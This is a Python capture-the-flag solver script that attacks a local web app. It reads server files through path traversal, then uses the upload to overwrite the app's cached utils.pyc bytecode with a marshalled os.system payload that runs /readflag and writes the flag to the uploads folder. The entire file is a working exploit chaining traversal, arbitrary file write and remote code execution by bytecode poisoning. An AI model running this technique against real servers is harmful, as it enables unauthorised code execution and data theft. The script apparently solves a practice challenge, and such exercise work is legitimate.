import requests
import struct
import time
import marshal
from io import BytesIO

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.PDF_MAGIC_NUMBER = b'%PDF-'
        self.BYTECODE_FILE_PATH = '/../__pycache__/utils.cpython-311.pyc'
        self.FIELD_SIZE = 4 # https://nowave.it/python-bytecode-analysis-1.html
        self.RCE_SOURCE_CODE = '__import__("os").system("sh -c /readflag > /app/uploads/flag.txt")'
        self.BYTECODE_FILENAME = '/app/utils.py'
        self.EXFILTRATED_FLAG_FILENAME = 'flag.txt'

    def upload(self, filename, fileContent):
        fileBytes = BytesIO(fileContent)
        file = { 'file': (filename, fileBytes, 'application/pdf') }
        requests.post(self.baseUrl, files=file)

    def readFile(self, filename):
        parameter = { 'filename': filename }
        return requests.get(self.baseUrl, params=parameter).content

    def modifyBytecode(self, bytecode):
        # https://nowave.it/python-bytecode-analysis-1.html
        # all headers MUST match to the original one, otherwise Python will re-compile it again
        headers = bytecode[0:16]
        magicNumber, bitField, modDate, sourceSize = [headers[i:i + self.FIELD_SIZE] for i in range(0, len(headers), self.FIELD_SIZE)]

        modTime = time.asctime(time.localtime(struct.unpack("=L", modDate)[0]))
        unpackedSourceSize = struct.unpack("=L", sourceSize)[0]

        print(f'[*] Magic number: {magicNumber}')
        print(f'[*] Bit field: {bitField}')
        print(f'[*] Modification time: {modTime}')
        print(f'[*] Source size: {unpackedSourceSize}')

        codeObject = compile(self.RCE_SOURCE_CODE, self.BYTECODE_FILENAME, 'exec')
        codeBytes = marshal.dumps(codeObject)

        newBytecode = magicNumber + bitField + modDate + sourceSize + codeBytes + self.PDF_MAGIC_NUMBER
        return newBytecode
    
    def solve(self):
        print('[*] Force compile utils.py bytecode file on the server...')
        dummyFileContent = b'foo' + self.PDF_MAGIC_NUMBER
        self.upload('test.txt', dummyFileContent)

        print('[*] Reading the bytecode file content...')
        bytecode = self.readFile(self.BYTECODE_FILE_PATH)
        print(f'[+] Bytecode file content:\n{bytecode}')

        print('[*] Modifying the bytecode with our own RCE payload...')
        newBytecode = self.modifyBytecode(bytecode)
        print(f'[+] RCE payload:\n{newBytecode}')

        print('[*] Overwriting the original bytecode file with our own RCE payload...')
        self.upload(self.BYTECODE_FILE_PATH, newBytecode)

        print('[*] Executing the overwritten bytecode file...')
        self.upload('test.txt', dummyFileContent)

        # the RCE payload executes binary `/readflag` and outputs the flag to `/app/uploads/flag.txt`.
        # now we can read the flag
        flag = self.readFile(self.EXFILTRATED_FLAG_FILENAME).decode()
        print(f'[+] Flag: {flag}')

if __name__ == '__main__':
    baseUrl = 'http://localhost:5000/'
    solver = Solver(baseUrl)

    solver.solve()